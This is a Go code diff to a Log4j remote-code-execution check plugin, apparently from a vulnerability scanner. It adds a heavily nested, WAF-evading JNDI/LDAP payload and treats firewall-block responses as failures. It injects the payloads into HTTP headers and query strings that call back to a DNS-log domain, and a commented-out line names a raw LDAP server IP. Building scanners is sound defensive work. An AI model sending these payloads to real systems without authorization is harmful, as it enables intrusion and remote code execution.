@@ -55,7 +55,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	_ = meta
 	randString := utils.RandStringRunes(6)
 	// count := 0
-	randStr := domain + ".${:-" + randString + "}"
+	randStr := domain + ".${:-" + randString + "}.${hostName}"
 	trueWord := domain + "." + randString
 	// randStr = "nowqq" + utils.RandStringRunes(6)
 	fmt.Println(randStr)
@@ -66,6 +66,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 		//"${j${aaa::::-n}d${:-}i:ldap://",
 		//"${j${aaa::::-n}d${:-}i:ldap://",
 		"${j${:-}n${:-}d${:-}i:l${:-}d${:-}a${:-p:}//",
+		"${jn${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${:-}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}d}}}}}}}}i}}}}:ldap://",
 	}
 
 	reqPaths := []string{
@@ -98,12 +99,12 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 
 	timeOutCount := 0
 	normalRequestCount := 0
-	totalCount :=0
+	totalCount := 0
 
 	for _, payload := range payloads {
 		// fullPayload := payload
 		fullPayload := fmt.Sprintf("%s%s.%s/}?a", payload, randStr, utils.DNS_LOG_DOMAIN)
-		// fullPayload := fmt.Sprintf("%s134.175.244.170:1389/by9aum}", payload)
+		// fullPayload := fmt.Sprintf("%s134.175.244.170:1389/hwojz0}", payload)
 		for _, reqPath := range reqPaths {
 			for _, method := range methods {
 				var request *http.Request
@@ -116,7 +117,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 				// fmt.Println(count)
 				for _, header := range headers {
 
-					if timeOutCount > 2 && normalRequestCount < 3 && totalCount > 5{
+					if timeOutCount > 2 && normalRequestCount < 3 && totalCount > 5 {
 						return false
 					}
 
@@ -149,7 +150,9 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 					if &resp != nil && err == nil {
 						if resp.Other != nil {
 							normalRequestCount++
-							if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 {
+							if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 ||
+								strings.Contains(string(resp.Body), "WAF") ||
+								strings.Contains(string(resp.Body), "防火墙") {
 								return false
 							}
 						}
@@ -161,7 +164,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 
 				request, _ = http.NewRequest(method, URL+reqPath+"?id="+fullPayload, nil)
 				for _, header := range headers {
-					if timeOutCount > 2 && normalRequestCount < 3 && totalCount > 5{
+					if timeOutCount > 2 && normalRequestCount < 3 && totalCount > 5 {
 						return false
 					}
 					request.Header.Set(header, fullPayload)
@@ -191,7 +194,9 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 					if &resp != nil && err == nil {
 						normalRequestCount++
 						if resp.Other != nil {
-							if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 {
+							if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 ||
+								strings.Contains(string(resp.Body), "WAF") ||
+								strings.Contains(string(resp.Body), "防火墙") {
 								return false
 							}
 						}
@@ -213,7 +218,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 
 	}
 
-	time.Sleep(time.Duration(6) * time.Second)
+	time.Sleep(time.Duration(15) * time.Second)
 
 	if utils.IsExistDNSLog(trueWord) {
 		result := d.info
